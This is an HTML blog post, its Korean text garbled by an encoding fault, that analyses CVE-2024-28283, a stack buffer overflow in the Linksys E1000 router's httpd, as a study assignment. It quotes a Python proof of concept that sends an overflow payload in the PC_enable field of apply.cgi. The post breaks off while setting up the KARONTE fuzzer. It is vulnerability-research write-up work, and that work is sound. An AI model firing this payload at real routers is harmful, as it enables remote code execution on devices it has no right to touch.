<!DOCTYPE html> <html lang=" en "><head> <meta charset="utf-8" /> <title> CVE-2024-28283 ë¶„ì„ê³¼ KARONTE fuzzer í™œìš© - TouBVa </title> <meta http-equip="X-UA-Compatible" content="IE=edge" /> <meta name="viewport" content="width=device-width, initial-scale=1" /> <meta name="description" content="CVE PoCë¥¼ ë¶„ì„í•˜ë©° KARONTEë¡œ ë°œê²¬ ê³¼ì •ì„ ì¬í˜„í•´ë³´ë ¤ ë…¸ë ¥í–ˆë‹¤- CVE-2024-28283 ë¶„ì„ê³¼ KARONTE fuzzer í™œìš©"> <meta name="keywords" content="CVE-2024-28283 ë¶„ì„ê³¼ KARONTE fuzzer í™œìš©, TouBVa, fuzzing, paper_study,fuzzing, IoT, CVE_ë¶„ì„"/> <link rel="alternate" type="application/rss+xml" title="RSS" href="/feed.xml" /> <meta content="" property="fb:app_id" /> <meta content="TouBVa" property="og:site_name" /> <meta content="CVE-2024-28283 ë¶„ì„ê³¼ KARONTE fuzzer í™œìš©" property="og:title" /> <meta content="article" property="og:type" /> <meta content="CVE PoCë¥¼ ë¶„ì„í•˜ë©° KARONTEë¡œ ë°œê²¬ ê³¼ì •ì„ ì¬í˜„í•´ë³´ë ¤ ë…¸ë ¥í–ˆë‹¤" property="og:description" /> <meta content="https://touBVa.github.io/blog/fuzzing/2025-01-27-CVE-2024-28283" property="og:url" /> <meta content="2025-01-26T22:00:00-06:00" property="article:published_time" /> <meta content="https://touBVa.github.io/about/" property="article:author" /> <meta content="https://touBVa.github.io/assets/img/posts/2025-01-27-CVE-2024-28283/image.png" property="og:image" /> <meta content="fuzzing" property="article:section" /> <!-- Twitter Cards --> <meta name="twitter:card" content="summary" /> <meta name="twitter:site" content="@" /> <meta name="twitter:creator" content="@" /> <meta name="twitter:title" content="CVE-2024-28283 ë¶„ì„ê³¼ KARONTE fuzzer í™œìš©" /> <meta name="twitter:url" content="https://touBVa.github.io/blog/fuzzing/2025-01-27-CVE-2024-28283" /> <meta name="twitter:description" content="CVE PoCë¥¼ ë¶„ì„í•˜ë©° KARONTEë¡œ ë°œê²¬ ê³¼ì •ì„ ì¬í˜„í•´ë³´ë ¤ ë…¸ë ¥í–ˆë‹¤" /> <link rel="stylesheet" href="https://touBVa.github.io/assets/css/main.css" /> <!-- <link rel="stylesheet" href="https://touBVa.github.io/assets/css/custom-style.css" /> --> <link rel="stylesheet" href="https://touBVa.github.io/assets/bower_components/lightgallery/dist/css/lightgallery.min.css" /> <link rel="stylesheet" href="https://cdn.snipcart.com/themes/v3.0.0-beta.3/default/snipcart.css" /> <link rel="stylesheet" href="https://touBVa.github.io/assets/bower_components/bootstrap/dist/css/bootstrap.min.css" /> <link rel="stylesheet" href="https://touBVa.github.io/assets/bower_components/font-awesome/web-fonts-with-css/css/fontawesome-all.min.css" /> <link rel="stylesheet" href="https://touBVa.github.io/assets/bower_components/icono/dist/icono.min.css" /> <!-- Fonts--> <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet" /> <!-- Favicon --> <link rel="icon" href="https://touBVa.github.io/assets/img/favicon.ico" type="image/gif" sizes="16x16" /> <script> var base_url = 'https://touBVa.github.io' ; </script> <!-- Jquery --> <script src="https://code.jquery.com/jquery-3.4.1.min.js" integrity="sha384-vk5WoKIaW/vJyUAd9n/wmopsmNhiy+L2Z+SBxGYnUkunIxVxAv/UtMOhba/xskxh" crossorigin="anonymous" ></script> <!-- <script src="https://touBVa.github.io/assets/bower_components/jquery/dist/jquery.min.js"></script> --> <script src="https://touBVa.github.io/assets/bower_components/jquery.easing/jquery.easing.min.js"></script> <script src="https://touBVa.github.io/assets/bower_components/bootstrap/dist/js/bootstrap.bundle.min.js"></script> <script src="https://touBVa.github.io/assets/bower_components/jquery-mousewheel/jquery.mousewheel.min.js"></script> <script src="https://touBVa.github.io/assets/bower_components/ghosthunter/dist/jquery.ghostHunter.min.js"></script> <script src="https://touBVa.github.io/assets/bower_components/lightgallery/dist/js/lightgallery-all.min.js"></script> <script src="https://cdnjs.cloudflare.com/ajax/libs/picturefill/3.0.2/picturefill.min.js"></script> <script src="https://touBVa.github.io/assets/bower_components/imagesloaded/imagesloaded.pkgd.min.js"></script> <script src="https://touBVa.github.io/assets/bower_components/nanobar/nanobar.min.js"></script> <script src="https://touBVa.github.io/assets/bower_components/typewrite/dist/typewrite.min.js"></script> <script src="https://touBVa.github.io/assets/js/search.js"></script> <script src="https://touBVa.github.io/assets/js/on-scroll-progress.js"></script> <script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.20.1/moment.min.js"></script> <script src="https://identity.netlify.com/v1/netlify-identity-widget.js"></script> <!-- for Mathjax support --> <script type="text/x-mathjax-config"> MathJax.Hub.Config({ TeX: { equationNumbers: { autoNumber: "AMS" } } }); </script> <script type="text/javascript" async src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script> <!-- Github Button --> <script async defer src="https://buttons.github.io/buttons.js"></script> <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js" integrity="sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49" crossorigin="anonymous" ></script> <!--[if lt IE 7]> <html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]--> <!--[if IE 7]> <html class="no-js lt-ie9 lt-ie8"> <![endif]--> <!--[if IE 8]> <html class="no-js lt-ie9"> <![endif]--> <!--[if gt IE 8]><!--> <html class="no-js"> <!--<![endif]--> </head> <body> <nav class="navbar navbar-expand-lg fixed-top navbar-dark nav-down" id="topNav"> <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation" > <span class="icono-hamburger" id="navbar-hamburger"> </span> </button> <a class="navbar-brand" href="/">TouBVa</a> <div class="collapse navbar-collapse" id="navbarNav"> <ul class="navbar-nav"> <li class="nav-item"> <a class="nav-link" href="https://touBVa.github.io/" >Home</a > </li> <li class="nav-item"> <a class="nav-link" href="https://touBVa.github.io/about" >About</a > </li> <li class="nav-item"> <a class="nav-link" href="https://touBVa.github.io/blog" >Blog</a > </li> <li class="nav-item"> <a class="nav-link" href="https://touBVa.github.io/contact" >Contact</a > </li> </ul> </div> <ul class="nav justify-content-end"> <!-- <li class="nav-item"> <a class="nav-link" href="https://touBVa.github.io/styleguide"> Styleguide </a> </li> --> <li class="nav-item"> <a class="nav-link toggle-search-button" href="#search"> <i class="fa fa-search search-icon" aria-hidden="true"></i> </a> </li> <!-- <li class="nav-item" style="margin-top:5px; padding-right:20px;" > <a class="header__checkout snipcart-checkout"> <svg width="31" height="27" viewBox="0 0 31 27" fill="none" xmlns="http://www.w3.org/2000/svg"> <path d="M1.10512 0.368718C0.560256 0.368718 0.118164 0.812066 0.118164 1.35848C0.118164 1.9049 0.560256 2.34824 1.10512 2.34824H4.90887L8.30138 18.4009C8.43503 19.0053 8.83085 19.5079 9.32946 19.5041H25.7788C26.3005 19.5118 26.7799 19.0375 26.7799 18.5143C26.7799 17.9911 26.3006 17.5168 25.7788 17.5245H10.1315L9.71003 15.545H27.095C27.5371 15.5412 27.9547 15.2048 28.0511 14.7718L30.354 4.87412C30.4825 4.29933 29.9852 3.67172 29.3979 3.66786H7.21171L6.6771 1.15221C6.58329 0.71276 6.15921 0.368652 5.7107 0.368652L1.10512 0.368718ZM7.623 5.64746H12.7634L13.2569 8.61674H8.25005L7.623 5.64746ZM14.7785 5.64746H20.9881L20.4946 8.61674H15.2719L14.7785 5.64746ZM23.0031 5.64746H28.1537L27.4649 8.61674H22.5097L23.0031 5.64746ZM8.67181 10.5963H13.5862L14.0797 13.5656H9.29919L8.67181 10.5963ZM15.6009 10.5963H20.1656L19.6721 13.5656H16.0944L15.6009 10.5963ZM22.1807 10.5963H27.0023L26.3135 13.5656H21.6872L22.1807 10.5963ZM12.6197 20.164C10.8141 20.164 9.32979 21.6525 9.32979 23.4632C9.32979 25.2739 10.8141 26.7624 12.6197 26.7624C14.4252 26.7624 15.9095 25.2739 15.9095 23.4632C15.9095 21.6525 14.4252 20.164 12.6197 20.164ZM22.4892 20.164C20.6837 20.164 19.1994 21.6525 19.1994 23.4632C19.1994 25.2739 20.6837 26.7624 22.4892 26.7624C24.2948 26.7624 25.7791 25.2739 25.7791 23.4632C25.7791 21.6525 24.2948 20.164 22.4892 20.164ZM12.6197 22.1435C13.3586 22.1435 13.9356 22.7222 13.9356 23.4632C13.9356 24.2042 13.3586 24.7829 12.6197 24.7829C11.8807 24.7829 11.3037 24.2042 11.3037 23.4632C11.3037 22.7222 11.8807 22.1435 12.6197 22.1435ZM22.4892 22.1435C23.2282 22.1435 23.8052 22.7222 23.8052 23.4632C23.8052 24.2042 23.2282 24.7829 22.4892 24.7829C21.7503 24.7829 21.1733 24.2042 21.1733 23.4632C21.1733 22.7222 21.7503 22.1435 22.4892 22.1435Z" fill="#ff7901" class="header__checkout-fill"></path> </svg> <span class="snipcart-items-count"></span> <span class="snipcart-total-price"></span> </a> </li> --> <script type="text/javascript"> var didScroll; var lastScrollTop = 0; var delta = 5; var navbarHeight = document.querySelector('#topNav').offsetHeight; window.addEventListener('scroll', function(event) { didScroll = true; }); setInterval(function() { if (didScroll) { hasScrolled(); didScroll = false; } }, 250); function hasScrolled() { var st = window.pageYOffset || document.documentElement.scrollTop; if (Math.abs(lastScrollTop - st) <= delta) return; var nav = document.querySelector('#topNav'); var prog = document.querySelector('#progress-bar'); if (st > lastScrollTop && st > navbarHeight) { nav.classList.remove('nav-down'); nav.classList.add('nav-up'); prog.classList.remove('toDown'); prog.classList.add('toUp'); } else { if (st < lastScrollTop) { nav.classList.remove('nav-up'); nav.classList.add('nav-down'); prog.classList.remove('toUp'); prog.classList.add('toDown'); } } lastScrollTop = st; } </script> <!-- <li class="nav-item"> <input class="nav-link switch theme-toggle" type="checkbox" name="checkbox" /> </li> --> </ul> </nav> <div id="progress-bar"></div> <!-- Search Form --> <div class="search-form-container"> <form class="search-form"> <fieldset class="search-form__fieldset"> <div class="row"> <div class="col-lg-8 offset-md-2"> <input class="search-form__field" placeholder="Type to Search..." autofocus> <input class="search-form__submit" type="submit" value="search"> </div> </div> </fieldset> </form> <div class="row"> <div class="col-lg-8 offset-md-2 search-results"> <div class="card search-results"></div> </div> </div> <div class="close-search-button search-form-container__close"> <i class="fa fa-times icon"></i> </div> </div><div class="main-container"> <div class="row justify-content-center" id="blog-post-container"> <div class="col-lg-10"><article class="card" itemscope itemtype="http://schema.org/BlogPosting"> <div class="card-header"> <h1 class="post-title" itemprop="name headline">CVE-2024-28283 ë¶„ì„ê³¼ KARONTE fuzzer í™œìš©</h1> <h4 class="post-meta">CVE PoCë¥¼ ë¶„ì„í•˜ë©° KARONTEë¡œ ë°œê²¬ ê³¼ì •ì„ ì¬í˜„í•´ë³´ë ¤ ë…¸ë ¥í–ˆë‹¤</h4> <p class="post-summary"> Posted by : <span itemprop="author" itemscope itemtype="http://schema.org/Person"> <span itemprop="name"><a href="https://touBVa.github.io/blog/authors/TouBVa">TouBVa</a></span> </span > at <time datetime="2025-01-26 22:00:00 -0600" itemprop="datePublished" >Jan 26, 2025</time > </p> <span class="disqus-comment-count" data-disqus-identifier="/blog/fuzzing/2025-01-27-CVE-2024-28283" ></span> <div class="post-categories"> Category : <a href="/blog/categories/fuzzing" >fuzzing</a > &nbsp; <a href="/blog/categories/paper_study" >paper_study</a > </div> </div> <div class="card-body" itemprop="articleBody"> <img class="card-img-top " src="https://touBVa.github.io/assets/img/posts/2025-01-27-CVE-2024-28283/image.png" alt="" style="height: 50%; width: 50%; display: block; margin-left: auto; margin-right: auto;" /> <br /> <br /> <ul id="markdown-toc"> <li><a href="#-ë¬¸ì œ" id="markdown-toc--ë¬¸ì œ">ğŸ’¯ ë¬¸ì œ</a> <ul> <li><a href="#ï¸-ì¡°ê±´" id="markdown-toc-ï¸-ì¡°ê±´">âœï¸ ì¡°ê±´</a></li> </ul> </li> <li><a href="#0-ì ‘ê·¼ë²•-ì„¤ì •" id="markdown-toc-0-ì ‘ê·¼ë²•-ì„¤ì •">0. ì ‘ê·¼ë²• ì„¤ì •</a> <ul> <li><a href="#01-íƒìƒ‰-ë²”ìœ„-ì¢íˆê¸°" id="markdown-toc-01-íƒìƒ‰-ë²”ìœ„-ì¢íˆê¸°">0.1. íƒìƒ‰ ë²”ìœ„ ì¢íˆê¸°</a></li> <li><a href="#02-cve-2024-28283-ì¡°ì‚¬" id="markdown-toc-02-cve-2024-28283-ì¡°ì‚¬">0.2. CVE-2024-28283 ì¡°ì‚¬</a></li> <li><a href="#03-ì·¨ì•½ì -ë¶„ì„-ë³´ê³ ì„œ-ì›ë³¸-ì •ë¦¬" id="markdown-toc-03-ì·¨ì•½ì -ë¶„ì„-ë³´ê³ ì„œ-ì›ë³¸-ì •ë¦¬">0.3. ì·¨ì•½ì  ë¶„ì„ ë³´ê³ ì„œ ì›ë³¸ ì •ë¦¬</a> <ul> <li><a href="#031-ì·¨ì•½ì -ì›ì¸" id="markdown-toc-031-ì·¨ì•½ì -ì›ì¸">0.3.1. ì·¨ì•½ì  ì›ì¸</a></li> <li><a href="#032-ì·¨ì•½ì -poc" id="markdown-toc-032-ì·¨ì•½ì -poc">0.3.2. ì·¨ì•½ì  PoC</a></li> <li><a href="#033-ì·¨ì•½ì -ìµìŠ¤í”Œë¡œì‡-ê²°ê³¼" id="markdown-toc-033-ì·¨ì•½ì -ìµìŠ¤í”Œë¡œì‡-ê²°ê³¼">0.3.3. ì·¨ì•½ì  ìµìŠ¤í”Œë¡œì‡ ê²°ê³¼</a></li> </ul> </li> </ul> </li> <li><a href="#1-ì‹¤-ë¶„ì„-ìˆ˜í–‰" id="markdown-toc-1-ì‹¤-ë¶„ì„-ìˆ˜í–‰">1. ì‹¤ ë¶„ì„ ìˆ˜í–‰</a> <ul> <li><a href="#10-karonteë¥¼-í™œìš©í•œ-ë¶„ì„" id="markdown-toc-10-karonteë¥¼-í™œìš©í•œ-ë¶„ì„">1.0. KARONTEë¥¼ í™œìš©í•œ ë¶„ì„</a> <ul> <li><a href="#100-íŒì›¨ì–´-ë¶„ì„ì€-ì–´ë–»ê²Œ-ì‹œì‘í•´ì•¼-í•˜ëŠ”ê°€" id="markdown-toc-100-íŒì›¨ì–´-ë¶„ì„ì€-ì–´ë–»ê²Œ-ì‹œì‘í•´ì•¼-í•˜ëŠ”ê°€">1.0.0. íŒì›¨ì–´ ë¶„ì„ì€ ì–´ë–»ê²Œ ì‹œì‘í•´ì•¼ í•˜ëŠ”ê°€?</a></li> <li><a href="#101-karonte-input-íŒŒì¸" id="markdown-toc-101-karonte-input-íŒŒì¸">1.0.1. KARONTE input íŒŒì¸</a></li> <li><a href="#102-unpack" id="markdown-toc-102-unpack">1.0.2. unpack</a></li> </ul> </li> <li><a href="#11-ì •ì -ë¶„ì„" id="markdown-toc-11-ì •ì -ë¶„ì„">1.1. ì •ì  ë¶„ì„</a> <ul> <li><a href="#110-ë¶„ì„-ëŒ€ìƒ-íŒŒì¼-ì°¾ê¸°" id="markdown-toc-110-ë¶„ì„-ëŒ€ìƒ-íŒŒì¼-ì°¾ê¸°">1.1.0. ë¶„ì„ ëŒ€ìƒ íŒŒì¼ ì°¾ê¸°</a></li> <li><a href="#111-ë¶„ì„" id="markdown-toc-111-ë¶„ì„">1.1.1. ë¶„ì„</a></li> </ul> </li> <li><a href="#12-ìµìŠ¤í”Œë¡œì‡-í™˜ê²½-ì…‹ì—…" id="markdown-toc-12-ìµìŠ¤í”Œë¡œì‡-í™˜ê²½-ì…‹ì—…">1.2. ìµìŠ¤í”Œë¡œì‡ í™˜ê²½ ì…‹ì—…</a></li> <li><a href="#13-ìµìŠ¤í”Œë¡œì‡-ì„¤ê³„" id="markdown-toc-13-ìµìŠ¤í”Œë¡œì‡-ì„¤ê³„">1.3. ìµìŠ¤í”Œë¡œì‡ ì„¤ê³„</a></li> <li><a href="#14-ìµìŠ¤í”Œë¡œì‡" id="markdown-toc-14-ìµìŠ¤í”Œë¡œì‡">1.4. ìµìŠ¤í”Œë¡œì‡</a></li> </ul> </li> <li><a href="#2-ìµìŠ¤í”Œë¡œì‡ì„-í†µí•´-ê°€ëŠ¥í•œ-ì¹¨í•´-ì‹œë‚˜ë¦¬ì˜¤" id="markdown-toc-2-ìµìŠ¤í”Œë¡œì‡ì„-í†µí•´-ê°€ëŠ¥í•œ-ì¹¨í•´-ì‹œë‚˜ë¦¬ì˜¤">2. ìµìŠ¤í”Œë¡œì‡ì„ í†µí•´ ê°€ëŠ¥í•œ ì¹¨í•´ ì‹œë‚˜ë¦¬ì˜¤</a></li> <li><a href="#3-mitigation-ì œì‹œ" id="markdown-toc-3-mitigation-ì œì‹œ">3. Mitigation ì œì‹œ</a></li> </ul> <p><br /></p> <h1 id="-ë¬¸ì œ">ğŸ’¯ ë¬¸ì œ</h1> <p class="notice">ì£¼ì–´ì§„ íŒì›¨ì–´ ë‚´ ì‹¤í–‰ íŒŒì¼ì„ ì¶”ì¶œí•˜ì—¬ ë¶„ì„í•˜ê³ , ì–´ë–¤ 1-day ì·¨ì•½ì ì´ ì¡´ì¬í•˜ëŠ”ì§€ ë¶„ì„í•˜ë¼.</p> <h3 id="ï¸-ì¡°ê±´">âœï¸ ì¡°ê±´</h3> <ul class="notice"> <li>E1000 ë¼ìš°í„° íŒì›¨ì–´</li> <li>ì‹¤í–‰íŒŒì¼ ì´ë¦„: httpd</li> <li>ì‚¬ìš©ì ì…ë ¥ í•¨ìˆ˜: get_cgi</li> <li>ì·¨ì•½ì  ì¢…ë¥˜: buffer overflow</li> </ul> <p><a href="/assets/img/posts/2025-01-27-CVE-2024-28283/FW_E1000_2.1.03.005_US_20140321.bin">FW_E1000_2.1.03.005_US_20140321.bin</a></p> <p><br /></p> <h1 id="0-ì ‘ê·¼ë²•-ì„¤ì •">0. ì ‘ê·¼ë²• ì„¤ì •</h1> <h2 id="01-íƒìƒ‰-ë²”ìœ„-ì¢íˆê¸°">0.1. íƒìƒ‰ ë²”ìœ„ ì¢íˆê¸°</h2> <ul> <li>1-day ì·¨ì•½ì ì´ ì¡´ì¬í•œë‹¤ â†’ ì´ë¯¸ ì •ë³´ê°€ ê³µê°œëœ ì·¨ì•½ì </li> <li>ì·¨ì•½ì ì˜ ì •ë³´ê°€ ê³µê°œë˜ì–´ ìˆë‹¤ â†’ ë†’ì€ í™•ë¥ ë¡œ CVEë¥¼ ë°›ì•˜ë‹¤</li> <li>ìœ„ì™€ ê°™ì€ ì·¨ì•½ì ì´ CVE ë“±ë¡ë˜ì—ˆë‹¤ë©´, í•„ìˆ˜ì ìœ¼ë¡œ E1000 router, httpd í‚¤ì›Œë“œê°€ descriptionì— ìˆì„ ê²ƒì´ë‹¤</li> </ul> <p>ë”°ë¼ì„œ ê²€ìƒ‰í•´ ë³´ì•˜ìŒ</p> <p><img src="/assets/img/posts/2025-01-27-CVE-2024-28283/image.png" alt="/assets/img/posts/2025-01-27-CVE-2024-28283/image.png" width="80%" height="80%" /></p> <p><br /></p> <p>CVE-2024-28283ì´ ë‚˜ì™”ê³ , ë‚´ë¶€ descriptionì€ ì•„ë˜ì™€ ê°™ì•˜ìŒ</p> <blockquote> <p>There is stack-based buffer overflow vulnerability in pc_change_act function in Linksys E1000 router firmware version v.2.1.03 and before, leading to remote code execution.</p> </blockquote> <p><br /></p> <p>ë‚´ìš©ë§Œ ì½ì–´ë³´ë©´, ë§¤ìš° ë†’ì€ í™•ë¥ ë¡œ í•´ë‹¹ CVEê°€ ë¬¸ì œ ì·¨ì•½ì ì¼ ê°€ëŠ¥ì„±ì´ ë†’ìŒ.</p> <p>ë” í™•ì‹¤í•œ êµì°¨ ê²€ì¦ì„ ìœ„í•´ ê³¼ì œë¡œ ì£¼ì–´ì§„ íŒŒì¼ ë²„ì „ì„ í™•ì¸í•¨</p> <p><img src="/assets/img/posts/2025-01-27-CVE-2024-28283/image%201.png" alt="/assets/img/posts/2025-01-27-CVE-2024-28283/image.png" width="80%" height="80%" /></p> <p><br /></p> <p>ì •í™•íˆ ì¼ì¹˜í•˜ëŠ” ë²„ì „ì´ê¸° ë•Œë¬¸ì—, ë¬¸ì œ ì·¨ì•½ì ì€ CVE-2024-28283ì¸ ê²ƒìœ¼ë¡œ ê°€ì •í•˜ê³  ë¬¸ì œì— ì ‘ê·¼</p> <p><br /></p> <h2 id="02-cve-2024-28283-ì¡°ì‚¬">0.2. CVE-2024-28283 ì¡°ì‚¬</h2> <p>NVDëŠ” ì‹¤ì œë¡œ CVEê°€ ë“±ë¡ë˜ëŠ” ê¸°ê´€ì´ ì•„ë‹ˆë‹¤.</p> <p>CNAê°€ ìš´ì˜ê·œì •ì— ë”°ë¼ CVEë¥¼ ë“±ë¡í•˜ë©´ cve.orgì— ë“±ë¡ë˜ëŠ” í˜•ì‹ì´ë‹¤. NVDëŠ” ì´ë¥¼ Pull í•´ì„œ NVDìƒì— ë„£ê³  ê´€ë¦¬í•˜ë©° Assessmentë¥¼ ì• ì´ˆì— CVEê°€ CISAì˜ í›„ì›ì„ ë°›ê³ , NVDê°€ NISTì— ì˜í•´ ìš´ì˜ë˜ë©° NISTëŠ” CISAì™€ í•¨ê»˜ FISMA ì§‘í–‰ì„ ìœ„í•´ ì„¤ë¦½ëœ ê¸°ê´€ì´ë¯€ë¡œ, CVEì™€ NVD ë‘˜ ë‹¤ ì‹¤ì§ˆì ìœ¼ë¡œ ë¯¸ ì •ë¶€ ì‚°í•˜ê¸°ê´€ìœ¼ë¡œ ë³´ë©´ ë˜ê¸´ í•˜ì§€ë§Œ, ì–´ì¨Œë“  ë‘˜ì€ ë³„ê°œì˜ ê¸°ê´€ì´ë‹¤.</p> <p>ì¦‰, ë” ì •í™•í•˜ê³  ë””í…Œì¼í•œ ì •ë³´ë¥¼ ë³´ê³  ì‹¶ë‹¤ë©´ cve.orgì— ì˜¬ë¼ì˜¨ CVE ì •ë³´ë¥¼ ë³´ëŠ” ê²Œ ì¢‹ë‹¤.</p> <p><br /></p> <p><img src="/assets/img/posts/2025-01-27-CVE-2024-28283/image%202.png" alt="/assets/img/posts/2025-01-27-CVE-2024-28283/image.png" width="80%" height="80%" /></p> <p><br /></p> <p>ì €ê¸° ë°‘ì— Referencesë¡œ ë‚˜ì˜¨ notion í˜ì´ì§€(<a href="https://www.notion.so/37b98eec45ea4fc991b9b5bea3db091d?pvs=21">https://d05004.notion.site/Linksys-E1000-BOF-37b98eec45ea4fc991b9b5bea3db091d</a>)ì— ë“¤ì–´ê°€ë©´ í•´ë‹¹ ì·¨ì•½ì  ë¶„ì„ì´ ë§¤ìš° ìƒì„¸í•˜ê²Œ ë‚˜ì™€ ìˆë‹¤.</p> <p><br /></p> <h2 id="03-ì·¨ì•½ì -ë¶„ì„-ë³´ê³ ì„œ-ì›ë³¸-ì •ë¦¬">0.3. ì·¨ì•½ì  ë¶„ì„ ë³´ê³ ì„œ ì›ë³¸ ì •ë¦¬</h2> <h3 id="031-ì·¨ì•½ì -ì›ì¸">0.3.1. ì·¨ì•½ì  ì›ì¸</h3> <ul> <li>ì›ì¸ì€ BoF</li> <li>BoFëŠ” <code class="language-plaintext highlighter-rouge">sprintf</code> í•¨ìˆ˜ ì‚¬ìš©ìœ¼ë¡œ ì¸í•´ ë°œìƒ(sprintf í•¨ìˆ˜ê°€ BoFì— ì·¨ì•½í•œ í•¨ìˆ˜ë¡œ, ì‹œíì–´ì½”ë”© ê·œì•½ì„ ìœ„ë°˜í•œ ì…ˆ)</li> <li>í•´ë‹¹ í•¨ìˆ˜ëŠ” íƒ€ê²Ÿ íŒì›¨ì–´ì˜ <code class="language-plaintext highlighter-rouge">pc_change_act</code> í•¨ìˆ˜ ë‚´ë¶€ì— ìˆìŒ</li> </ul> <p><br /></p> <h3 id="032-ì·¨ì•½ì -poc">0.3.2. ì·¨ì•½ì  PoC</h3> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>

<span class="n">target</span><span class="o">=</span><span class="nb">input</span><span class="p">(</span><span class="s">"Enter target IP: "</span><span class="p">)</span>
<span class="n">session_id</span><span class="o">=</span><span class="nb">input</span><span class="p">(</span><span class="s">"Enter session_id: "</span><span class="p">)</span>

<span class="n">url</span><span class="o">=</span><span class="s">"http://"</span><span class="o">+</span><span class="n">target</span><span class="o">+</span><span class="s">"/apply.cgi;session_id="</span><span class="o">+</span><span class="n">session_id</span>
<span class="n">headers</span><span class="o">=</span><span class="p">{}</span>
<span class="n">headers</span><span class="p">[</span><span class="s">"User-Agent"</span><span class="p">]</span><span class="o">=</span><span class="s">"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0"</span>
<span class="n">headers</span><span class="p">[</span><span class="s">"Accept"</span><span class="p">]</span><span class="o">=</span><span class="s">"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"</span>
<span class="n">headers</span><span class="p">[</span><span class="s">"Accept-Language"</span><span class="p">]</span><span class="o">=</span> <span class="s">"en-US,en;q=0.5"</span>
<span class="n">headers</span><span class="p">[</span><span class="s">"Accept-Encoding"</span><span class="p">]</span><span class="o">=</span> <span class="s">"gzip, deflate"</span>
<span class="n">headers</span><span class="p">[</span><span class="s">"Content-Type"</span><span class="p">]</span> <span class="o">=</span> <span class="s">"application/x-www-form-urlencoded"</span>
<span class="n">headers</span><span class="p">[</span><span class="s">"Origin"</span><span class="p">]</span><span class="o">=</span><span class="s">"http://"</span><span class="o">+</span><span class="n">target</span>
<span class="n">headers</span><span class="p">[</span><span class="s">"Connection"</span><span class="p">]</span><span class="o">=</span><span class="s">"close"</span>
<span class="n">headers</span><span class="p">[</span><span class="s">"Referer"</span><span class="p">]</span><span class="o">=</span><span class="s">"http://"</span><span class="o">+</span><span class="n">target</span><span class="o">+</span><span class="s">"/apply.cgi;session_id="</span><span class="o">+</span><span class="n">session_id</span>
<span class="n">headers</span><span class="p">[</span><span class="s">"Upgrade-Insecure_Requests"</span><span class="p">]</span><span class="o">=</span><span class="s">"1"</span>

<span class="n">data</span><span class="o">=</span><span class="p">{}</span>
<span class="n">data</span><span class="p">[</span><span class="s">"submit_button"</span><span class="p">]</span><span class="o">=</span><span class="s">"GuestNetworkSetting"</span>
<span class="n">data</span><span class="p">[</span><span class="s">"gui_action"</span><span class="p">]</span><span class="o">=</span><span class="s">"Apply"</span>

<span class="n">pay</span><span class="o">=</span><span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mh">0x30</span>	<span class="c1">#dummy
</span><span class="n">pay</span><span class="o">+=</span><span class="sa">b</span><span class="s">"B"</span><span class="o">*</span><span class="mi">4</span>		<span class="c1">#return address
</span><span class="n">data</span><span class="p">[</span><span class="s">"PC_enable"</span><span class="p">]</span><span class="o">=</span><span class="n">pay</span>

<span class="n">r</span><span class="o">=</span><span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
</code></pre></div></div> <p><br /></p> <h3 id="033-ì·¨ì•½ì -ìµìŠ¤í”Œë¡œì‡-ê²°ê³¼">0.3.3. ì·¨ì•½ì  ìµìŠ¤í”Œë¡œì‡ ê²°ê³¼</h3> <ul> <li>RCE <ul> <li>ì›¹ ê´€ë¦¬ì ê¶Œí•œì„ íšë“í•  ê²½ìš°, <code class="language-plaintext highlighter-rouge">apply.cgi</code> ì¸í„°í˜ì´ìŠ¤ì— ë“¤ì–´ê°€ëŠ” POST ìš”ì²­ì— <code class="language-plaintext highlighter-rouge">PC_enable</code> íŒŒë¼ë¯¸í„°ë¥¼ ì‚½ì…í•¨ìœ¼ë¡œì¨ RCEê°€ ê°€ëŠ¥í•´ì§</li> </ul> </li> </ul> <p><br /></p> <h1 id="1-ì‹¤-ë¶„ì„-ìˆ˜í–‰">1. ì‹¤ ë¶„ì„ ìˆ˜í–‰</h1> <p>ì›ë°ì´ë¼ëŠ” ì ì„ ì£¼ì—ˆê³ , ì·¨ì•½ì  ë°œìƒ í¬ì¸íŠ¸ë¥¼ ì£¼ì—ˆê¸° ë•Œë¬¸ì— ì•„ë§ˆ ë‹¹ ì ‘ê·¼ ë°©ë²•ì´ ì •ì„ì— ê°€ê¹Œìš¸ ê²ƒì´ë‹¤.</p> <p>ê·¸ëŸ¬ë‚˜ ì´ì „ì— ë°°ìš´ ì ì„ ì œëŒ€ë¡œ ì‘ìš©í•´ ë³´ê³  ì‹¶ì—ˆë‹¤.</p> <p>ë”°ë¼ì„œ ì´ ê³¼ì œë¥¼ ì´ì „ ê³¼ì œì™€ ì—°ê³„í•´ ë” ê³ ë„í™” ìˆ˜í–‰í•˜ëŠ” ë°©ë²•ì„ ê³ ë¯¼í–ˆë‹¤.</p> <p>ì €ë²ˆì£¼ì— ë…¼ë¬¸ìœ¼ë¡œ ì•Œë ¤ì¤€ KARONTEë¥¼ ì§ì ‘ ì´ìš©í•´ì„œ ë¬¸ì œ ë°”ì´ë„ˆë¦¬ì˜ ì·¨ì•½ì ì„ ì°¾ì•„ë‚´ê³ , ì •ì  ë° ë™ì  ë¶„ì„ê¹Œì§€ ìˆ˜í–‰ í›„, ê·¸ì— ëŒ€í•œ ìµìŠ¤í”Œë¡œì‡ê¹Œì§€ ì™„ë£Œí•˜ëŠ” ì‹œë‚˜ë¦¬ì˜¤ê°€ ì¢‹ì§€ ì•Šì„ê¹Œ?</p> <p>KARONTE 